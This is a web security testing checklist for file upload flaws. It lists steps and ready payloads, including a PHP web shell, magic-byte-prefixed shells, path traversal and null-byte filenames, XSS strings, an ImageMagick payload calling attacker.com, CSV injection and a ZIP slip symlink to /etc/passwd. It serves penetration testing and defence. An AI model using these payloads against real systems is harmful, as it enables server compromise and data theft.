# File Upload Vulnerabilities: Complete Checklist  
  
---  
  
# Section 1: Unrestricted File Type Uploads  
  
## 1.1 Malicious File Execution  
  
**How it works:**    
Application allows upload of executable files that can be executed on the server.  
  
**Steps to Find**  
  
1. Attempt to upload web shells (`.php`, `.asp`, `.jsp`, `.aspx`)  
2. Test double extensions (`shell.php.jpg`, `shell.php%00.jpg`)  
3. Try case manipulation (`.PhP`, `.AsPx`)  
4. Upload `.htaccess` to override server config  
5. Test less common extensions (`.phtml`, `.php5`, `.shtml`)  
6. Check if uploaded files are accessible via browser  
  
**Impact**  
  
- Remote code execution  
- Server compromise  
- Data theft  
  
---  
  
## 1.2 SVG / XSS Payloads  
  
**How it works:**    
SVG files can contain JavaScript that executes when viewed.  
  
**Steps to Find**  
  
1. Create SVG with embedded XSS payload  
2. Upload as profile picture or document  
3. Access uploaded file directly  
4. Test payload:  
  
xml  
<script>alert(1)</script>

5. Try `onclick` / `onload` events
    
6. Check if `Content-Type` validation exists
    

**Impact**

- Stored XSS
    
- Account takeover
    
- Session theft
    

---

## 1.3 HTML File Uploads

**How it works:**  
HTML files can contain phishing forms or malicious scripts.

**Steps to Find**

1. Upload HTML file with JavaScript
    
2. Upload HTML containing credential harvesting form
    
3. Check if HTML renders in browser
    
4. Test iframe injection
    
5. Try meta refresh redirects
    
6. Verify if script execution occurs
    

**Impact**

- Phishing attacks
    
- Stored XSS
    
- Session hijacking
    

---

# Section 2: Content-Type and Validation Bypasses

## 2.1 MIME Type Manipulation

**How it works:**  
Server relies only on the `Content-Type` header.

**Steps to Find**

1. Intercept upload request
    
2. Modify `Content-Type` to `image/jpeg`
    
3. Keep file content malicious
    
4. Try different MIME types
    
5. Remove the header entirely
    
6. Check if magic byte validation exists
    

**Impact**

- Arbitrary file upload
    
- Validation bypass
    

---

## 2.2 Magic Byte Spoofing

**How it works:**  
Server checks only file signatures.

**Steps to Find**

1. Add valid file headers to malicious file
    
2. Example:
    

GIF89a<?php system($_GET['cmd']); ?>

3. Try PNG header
    

\x89PNG\r\n\x1a\n

4. Try PDF header
    

%PDF-1.4

5. Try JPEG header
    

FF D8 FF E0

6. Check full file validation
    

**Impact**

- Bypass content validation
    
- Hide malicious files
    

---

## 2.3 Double Content-Type Attack

**How it works:**  
Server parses multiple headers inconsistently.

**Steps to Find**

1. Add multiple `Content-Type` headers
    
2. First header malicious, second allowed
    
3. Reverse order
    
4. Test header + body mismatch
    
5. Try multipart boundary confusion
    
6. Check parser inconsistencies
    

**Impact**

- Validation bypass
    

---

# Section 3: File Size and Quantity Limitations

## 3.1 Denial of Service via Large Files

**How it works:**  
No file size limits.

**Steps to Find**

1. Upload extremely large files
    
2. Upload multiple large files
    
3. Monitor disk usage
    
4. Test upload timeout handling
    
5. Upload compression bombs
    
6. Monitor memory usage
    

**Impact**

- DoS
    
- Server crash
    
- Financial loss
    

---

## 3.2 File Quota Bypass

**How it works:**  
Users exceed allocated storage.

**Steps to Find**

1. Fill storage quota
    
2. Upload more files
    
3. Test resumable uploads
    
4. Modify quota parameters
    
5. Delete files and recheck quota
    
6. Upload via multiple sessions
    

**Impact**

- Storage exhaustion
    
- Subscription bypass
    

---

## 3.3 Race Condition in Quota Checks

**How it works:**  
Quota checked before upload completion.

**Steps to Find**

1. Upload multiple files simultaneously
    
2. Monitor quota calculation
    
3. Check timing of quota checks
    
4. Use chunked uploads
    
5. Interrupt uploads
    
6. Resume uploads
    

**Impact**

- Unlimited storage
    

---

# Section 4: Path Traversal and Directory Tricks

## 4.1 Directory Traversal in Filename

**How it works:**  
Filename contains traversal paths.

**Steps to Find**

../../etc/passwd  
..\..\windows\win.ini  
%2e%2e%2f  
%252e%252e%252f  
..%c0%af  
....//....//

**Impact**

- File overwrite
    
- System compromise
    

---

## 4.2 Null Byte Injection

**How it works:**  
Null byte terminates string early.

**Payloads**

shell.php%00.jpg  
shell.php%00.png  
shell.asp%00.gif  
shell%00.php.jpg

**Impact**

- Extension bypass
    

---

## 4.3 Absolute Path Overwrite

**How it works:**  
User controls file storage path.

**Examples**

/var/www/html/shell.php  
C:\inetpub\wwwroot\cmd.asp

**Impact**

- System file overwrite
    
- Code execution
    

---

# Section 5: Metadata and Content Injection

## 5.1 EXIF Data Exploitation

**Steps**

1. Inject payload in EXIF metadata
    
2. Example:
    

exiftool -Artist='<script>alert(1)</script>' image.jpg

**Impact**

- Stored XSS
    
- Data injection
    

---

## 5.2 Filename XSS

**Payloads**

<script>alert(1)</script>.jpg  
"onload=alert(1).png

**Impact**

- Stored XSS
    

---

## 5.3 File Description Injection

**Steps**

1. Insert HTML/JS into description
    
2. Test markdown injection
    
3. Test CSS injection
    
4. Try data URL payloads
    

**Impact**

- XSS
    
- Data theft
    

---

# Section 6: Archive Exploits

## 6.1 ZIP Slip

**Payload**

../../etc/passwd

**Impact**

- File overwrite
    

---

## 6.2 ZIP Bomb

**Steps**

1. Upload recursive zip
    
2. Test server resource usage
    

**Impact**

- DoS
    

---

## 6.3 Archive File Overwrite

**Steps**

1. Archive contains same filenames as system files
    
2. Upload and extract
    

**Impact**

- Defacement
    
- Config overwrite
    

---

# Section 7: Image Upload Attacks

## 7.1 Image Parsing Vulnerabilities

**Steps**

1. Upload malformed JPEG
    
2. Upload large dimension image
    
3. Corrupt progressive JPEG
    
4. Test PNG chunk overflow
    

**Impact**

- DoS
    
- Memory corruption
    

---

## 7.2 ImageMagick Exploits

**Example Payload**

push graphic-context  
viewbox 0 0 1 1  
image over 0,0 1,1 'https://attacker.com?`whoami`'  
pop graphic-context

**Impact**

- RCE
    
- SSRF
    

---

## 7.3 Image Dimension Bomb

**Example**

100000 x 100000 resolution image

**Impact**

- Memory exhaustion
    

---

# Section 8: File Content Parsing Exploits

## 8.1 CSV Injection

**Payloads**

=CMD|' /C calc'!A0  
+HYPERLINK("http://attacker.com","Click")

**Impact**

- Client-side RCE
    

---

## 8.2 PDF Exploits

**Steps**

1. Upload PDF with embedded JS
    
2. Test external URL actions
    
3. Inject form fields
    

**Impact**

- Phishing
    
- Client attacks
    

---

## 8.3 XXE via Uploads

**Steps**

1. Upload XML with XXE payload
    
2. Test SVG
    
3. Test DOCX/XLSX
    
4. Test RSS feeds
    

**Impact**

- File read
    
- SSRF
    

---

# Section 9: Access Control Issues

## 9.1 IDOR in File Access

**Steps**

1. Upload file
    
2. Modify file ID
    
3. Access other users files
    

**Impact**

- Data breach
    

---

## 9.2 Privilege Escalation via File Access

**Steps**

1. Access admin upload directory
    
2. Test direct file URLs
    

**Impact**

- Privilege escalation
    

---

## 9.3 Unauthorized File Download

**Steps**

download.php?file=

Try:

../../config.php

**Impact**

- Source code leak
    

---

# Section 10: Rate Limiting and Brute Force

## 10.1 Unlimited Upload Attempts

**Impact**

- DoS
    
- Disk exhaustion
    

---

## 10.2 File Enumeration

**Examples**

file_1.jpg  
file_2.jpg  
file_3.jpg

**Impact**

- Mass data exposure
    

---

## 10.3 Upload Endpoint Brute Force

**Steps**

1. Automate uploads
    
2. Test IP limits
    
3. Test CAPTCHA
    

**Impact**

- Resource exhaustion
    

---

# Section 16: Testing Methodology

## Phase 1: Mapping Upload Functionality

Identify upload points:

- Profile pictures
    
- Documents (KYC)
    
- Product images
    
- Attachments
    
- CSV imports
    
- Rich text editors
    
- Logo uploads
    

Document processing:

- Storage location
    
- Naming pattern
    
- Virus scanning
    
- Image resizing
    
- Metadata extraction
    

---

## Phase 2: Functional Testing

**Happy Path**

- Upload
    
- Download
    
- Delete
    
- Replace
    
- Batch uploads
    

**Edge Cases**

- Empty files
    
- Very small files
    
- Max file size
    
- Unicode filenames
    
- No extension files
    

---

# Section 17: Tools and Resources

## Essential Tools

|Tool|Purpose|
|---|---|
|Burp Suite|Intercept upload requests|
|OWASP ZAP|Open-source testing|
|Postman|API testing|
|CyberChef|Encoding payloads|
|ExifTool|Metadata injection|
|ImageMagick|Image manipulation|
|FFmpeg|Video testing|
|Metasploit|Payload generation|
|SQLmap|SQLi testing|
|wfuzz / gobuster|Enumeration|
|S3Scanner|Cloud bucket testing|

---

## Example Payloads

### PHP Web Shell

<?php system($_GET['cmd']); ?>

### SVG XSS

![](data:image/svg+xml;utf8,%3Csvg%20onload%3D%22alert\(1\)%22%3E%3C%2Fsvg%3E)

### Magic Byte + PHP

GIF89a<?php system($_GET['cmd']); ?>

### ZIP Slip Creation

ln -s /etc/passwd slip.txt  
zip --symlinks slip.zip slip.txt

---

# Red Flags and Indicators

- Client-side validation only
    
- Files stored inside webroot
    
- Direct file URLs
    
- Predictable filenames
    
- Missing authentication on downloads
    
- No size limits
    
- Missing rate limiting
    
- Directory listing enabled
    
- Temporary files not deleted
    

---

# Checklist Summary

## File Type Validation

- Test executable extensions
    
- Test double extensions
    
- Test MIME manipulation
    
- Test SVG XSS
    
- Test HTML uploads
    

## Content Validation

- EXIF injection
    
- Filename XSS
    
- ZIP slip
    
- ZIP bomb
    
- CSV injection
    
- XXE
    

## Access Control

- IDOR
    
- Unauthenticated file access
    
- Directory traversal
    
- File enumeration
    

## Denial of Service

- Large uploads
    
- Concurrent uploads
    
- Image bombs
    
- Compression bombs